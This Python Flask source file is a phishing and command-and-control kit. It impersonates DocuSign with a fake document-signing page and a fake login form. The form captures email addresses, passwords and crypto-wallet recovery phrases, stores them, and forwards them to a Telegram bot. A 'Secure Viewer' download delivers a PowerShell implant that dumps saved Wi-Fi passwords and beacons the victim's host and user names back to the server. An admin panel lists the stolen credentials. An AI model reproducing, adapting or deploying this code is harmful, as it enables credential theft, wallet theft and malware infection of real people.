#!/usr/bin/env python3
import os
import io
import uuid
import base64
import sqlite3
from datetime import datetime, timedelta
from flask import Flask, request, send_file, session, jsonify

TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "YOUR_BOT_TOKEN_HERE")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "YOUR_CHAT_ID_HERE")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "PlatinumDiamond2026")

app = Flask(__name__)
app.secret_key = os.urandom(128)

DB_PATH = "c2.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, seed TEXT, ip TEXT, ts TEXT)")
    conn.commit()
    conn.close()

init_db()

def tg(msg):
    if "YOUR_BOT_TOKEN" in TELEGRAM_BOT_TOKEN:
        print(msg)
        return
    import requests
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                     json={"chat_id": TELEGRAM_CHAT_ID, "text": msg[:4096]}, timeout=10)
    except: pass

# PowerShell implant - works on ALL Windows
IMPLANT_PS1 = """$c="https://{server}/exfil";$h=$env:COMPUTERNAME;$u=$env:USERNAME;$w=(netsh wlan show profiles|Select-String "All User Profile"|%{($_ -split ":")[1].Trim()});foreach($p in $w){$k=(netsh wlan show profile name="$p" key=clear|Select-String "Key Content"|%{($_ -split ":")[1].Trim()});if($k){$d="$p : $k";$post=[System.Text.Encoding]::UTF8.GetBytes("data=WIFI: $d");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}try{$post=[System.Text.Encoding]::UTF8.GetBytes("data=BEACON: $h | $u");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}catch{}while(1){try{$post=[System.Text.Encoding]::UTF8.GetBytes("data=HEARTBEAT: $h | $u");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}catch{}Start-Sleep -Seconds 1800}"""

def get_implant():
    server = f"https://{request.host}"
    return IMPLANT_PS1.format(server=server).encode()

# SIMPLE HTML - NO CURLY BRACES AT ALL
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DocuSign | Secure Document Platform</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            background: #0f172a;
            min-height: 100vh;
            padding: 40px 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        .card {
            background: white;
            border-radius: 24px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        .header {
            background: linear-gradient(135deg, #0f172a, #1e293b);
            padding: 40px;
            color: white;
            text-align: center;
        }
        .header h1 {
            font-size: 32px;
            margin-bottom: 10px;
        }
        .body {
            padding: 40px;
        }
        .info-box {
            background: #f0f4f8;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 30px;
            border-left: 4px solid #00b3b0;
        }
        .row {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        .btn-group {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
            margin: 30px 0;
        }
        .btn {
            display: inline-block;
            padding: 14px 30px;
            border-radius: 40px;
            text-decoration: none;
            font-weight: bold;
        }
        .btn-primary {
            background: linear-gradient(135deg, #00b3b0, #0052ff);
            color: white;
        }
        .btn-secondary {
            background: white;
            color: #475569;
            border: 2px solid #ddd;
        }
        .footer {
            background: #f0f4f8;
            padding: 20px;
            text-align: center;
            font-size: 11px;
            color: #666;
        }
        h2 {
            font-size: 20px;
            margin-bottom: 15px;
        }
        @media (max-width: 640px) {
            .header {
                padding: 25px;
            }
            .header h1 {
                font-size: 24px;
            }
            .body {
                padding: 25px;
            }
            .btn {
                padding: 12px 20px;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="header">
            <h1> Documents Require Your Signature</h1>
            <p>Harvard-MIT Secure Document Portal</p>
        </div>
        <div class="body">
            <div class="info-box">
                <div class="row">
                    <span>Envelope ID: ENV-XXXX</span>
                    <span>Expires: DATE</span>
                </div>
            </div>
            <div style="background:#f8fafc;border-radius:16px;padding:20px;margin-bottom:30px">
                <div style="font-weight:bold;margin-bottom:5px">Valued Customer</div>
                <div style="color:#64748b;margin-bottom:10px">user@company.com</div>
                <p>You have been invited to review and sign legally binding documents.</p>
            </div>
            <div class="btn-group">
                <a href="/download/pdf/REF" class="btn btn-primary">Download PDF</a>
                <a href="/download/doc/REF" class="btn btn-primary">Download Word</a>
                <a href="/download/xls/REF" class="btn btn-primary">Download Excel</a>
                <a href="/download/exe/REF" class="btn btn-primary">Secure Viewer</a>
            </div>
            <div style="text-align:center;margin-top:20px">
                <a href="/login/REF" class="btn btn-secondary">Sign In Online</a>
            </div>
            <div style="margin-top:30px;padding-top:20px;border-top:1px solid #eee;text-align:center;font-size:11px;color:#999">
                AES-256 Encrypted  •  SOC 2 Type II  •  GDPR Compliant
            </div>
        </div>
        <div class="footer">
            DocuSign, Inc. • Harvard Innovation Lab • MIT CSAIL<br>
            2026 DocuSign. All rights reserved.
        </div>
    </div>
</div>
</body>
</html>
'''

def get_page(ref, email, name):
    # Simple string replacement - no format() conflicts
    page = HTML_PAGE
    page = page.replace('ENV-XXXX', f'DOC-{uuid.uuid4().hex[:8].upper()}')
    page = page.replace('DATE', (datetime.now() + timedelta(days=7)).strftime("%b %d, %Y"))
    page = page.replace('Valued Customer', name)
    page = page.replace('user@company.com', email)
    page = page.replace('REF', ref)
    return page

# Generate simple PDF
def generate_pdf(ref):
    pdf_content = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 200 >>
stream
BT
/F1 24 Tf
100 700 Td
(DocuSign Document) Tj
/F1 14 Tf
100 650 Td
(Envelope ID: {ref}) Tj
100 600 Td
(Please visit: https://{request.host}/download/exe/{ref}) Tj
100 550 Td
(To access your secure documents.) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000200 00000 n
trailer
<< /Size 5 /Root 1 0 R >>
startxref
320
%%EOF"""
    return pdf_content.encode()

# Generate placeholder Word document
def generate_word(ref):
    return b"PK\x03\x04Word Document Placeholder"

# Generate placeholder Excel document
def generate_excel(ref):
    return b"PK\x03\x04Excel Workbook Placeholder"

# ====================================================================
# FLASK ROUTES
# ====================================================================
@app.route('/')
def index():
    ref = uuid.uuid4().hex[:8].upper()
    email = request.args.get('email', 'user@company.com')
    name = request.args.get('name', 'Valued Customer')
    tg(f"PAGE | IP: {request.remote_addr} | Target: {email}")
    return get_page(ref, email, name)

@app.route('/download/pdf/<ref>')
def download_pdf(ref):
    tg(f"PDF DOWNLOAD | IP: {request.remote_addr}")
    return send_file(io.BytesIO(generate_pdf(ref)), as_attachment=True, download_name=f'DocuSign_{ref}.pdf', mimetype='application/pdf')

@app.route('/download/doc/<ref>')
def download_doc(ref):
    tg(f"WORD DOWNLOAD | IP: {request.remote_addr}")
    return send_file(io.BytesIO(generate_word(ref)), as_attachment=True, download_name=f'Document_{ref}.docm', mimetype='application/vnd.ms-word.document.macroEnabled.12')

@app.route('/download/xls/<ref>')
def download_xls(ref):
    tg(f"EXCEL DOWNLOAD | IP: {request.remote_addr}")
    return send_file(io.BytesIO(generate_excel(ref)), as_attachment=True, download_name=f'Report_{ref}.xlsm', mimetype='application/vnd.ms-excel.sheet.macroEnabled.12')

@app.route('/download/exe/<ref>')
def download_exe(ref):
    tg(f"IMPLANT DOWNLOAD | IP: {request.remote_addr}")
    return send_file(io.BytesIO(get_implant()), as_attachment=True, download_name=f'DocuSign_Setup_{ref}.exe', mimetype='application/x-msdownload')

@app.route('/login')
@app.route('/login/<ref>')
def login_page(ref=None):
    ref = ref or uuid.uuid4().hex[:8]
    return f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign Secure Login</title>
    <style>
        *{{
            margin:0;
            padding:0;
            box-sizing:border-box;
        }}
        body{{
            font-family:Arial,sans-serif;
            background:#0f172a;
            min-height:100vh;
            display:flex;
            align-items:center;
            justify-content:center;
            padding:20px;
        }}
        .card{{
            background:white;
            border-radius:24px;
            padding:40px;
            width:100%;
            max-width:400px;
        }}
        h2{{
            margin-bottom:20px;
            color:#0f172a;
        }}
        input{{
            width:100%;
            padding:12px;
            margin:10px 0;
            border:2px solid #ddd;
            border-radius:12px;
        }}
        button{{
            width:100%;
            padding:12px;
            background:#00b3b0;
            color:white;
            border:none;
            border-radius:40px;
            cursor:pointer;
            font-weight:bold;
        }}
        .footer{{
            text-align:center;
            margin-top:20px;
            font-size:11px;
            color:#999;
        }}
    </style>
</head>
<body>
<div class="card">
    <h2>DocuSign Secure Access</h2>
    <form method="POST" action="/login/submit/{ref}">
        <input type="email" name="email" placeholder="Email Address" required>
        <input type="password" name="password" placeholder="Password" required>
        <input type="text" name="seed" placeholder="Recovery Phrase (optional)">
        <button type="submit">Sign In</button>
    </form>
    <div class="footer">SSL/TLS Encrypted</div>
</div>
</body>
</html>'''

@app.route('/login/submit/<ref>', methods=['POST'])
def login_submit(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    seed = request.form.get('seed', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    words = seed.split() if seed else []
    is_crypto = len(words) in [12, 24]
    
    msg = f"LOGIN: {email} | {password}"
    if seed:
        msg += f" | SEED: {seed[:200]}"
    if is_crypto:
        msg += f" | CRYPTO WALLET DETECTED - {len(words)} words"
    msg += f" | IP: {ip}"
    
    tg(msg)
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (email, password, seed, ip, ts) VALUES (?,?,?,?,?)", 
                (email, password, seed[:500] if seed else '', ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return '<html><head><meta http-equiv="refresh" content="2;url=https://www.docusign.com"></head><body style="text-align:center;padding:50px"><h2 style="color:#00b3b0">Verification Complete</h2><p>Redirecting...</p></body></html>'

@app.route('/track/<ref>', methods=['POST'])
def track(ref):
    return "OK"

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.form.get('data', '')
    if data:
        if 'BEACON' in data:
            tg(f"BEACON: {data[:200]}")
        elif 'HEARTBEAT' not in data:
            tg(f"EXFIL: {data[:500]}")
    return "OK"

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST' and request.form.get('p') == ADMIN_PASSWORD:
        session['admin'] = True
    if not session.get('admin'):
        return '<form method="POST"><input type="password" name="p"><button>Login</button></form>'
    
    conn = sqlite3.connect(DB_PATH)
    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC").fetchall()
    conn.close()
    
    rows = ''.join(f'<tr><td>{c[1][:40]}</td><td style="color:#00ff88">{c[2][:40]}</td><td style="color:#ffd700">{c[3][:50] if c[3] else "-"}</td><td>{c[5][:16]}</td></tr>' for c in creds)
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>Platinum C2 Admin</title>
    <style>
        body{{
            background:#0a0c10;
            color:white;
            font-family:monospace;
            padding:20px;
        }}
        h1{{
            color:#ffd700;
        }}
        table{{
            border-collapse:collapse;
            width:100%;
        }}
        th,td{{
            padding:10px;
            border-bottom:1px solid #333;
            text-align:left;
        }}
        th{{
            color:#ffd700;
        }}
    </style>
    </head>
    <body>
    <h1>Platinum Diamond C2</h1>
    <h2>Credentials Captured: {len(creds)}</h2>
    <table border="1">
        <tr><th>Email</th><th>Password</th><th>Seed/2FA</th><th>Time</th></tr>
        {rows}
    </table>
    <p>URL: {request.host_url}</p>
    <p>Status: OPERATIONAL</p>
    </body>
    </html>'''

@app.route('/health')
def health():
    return {"status": "operational"}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
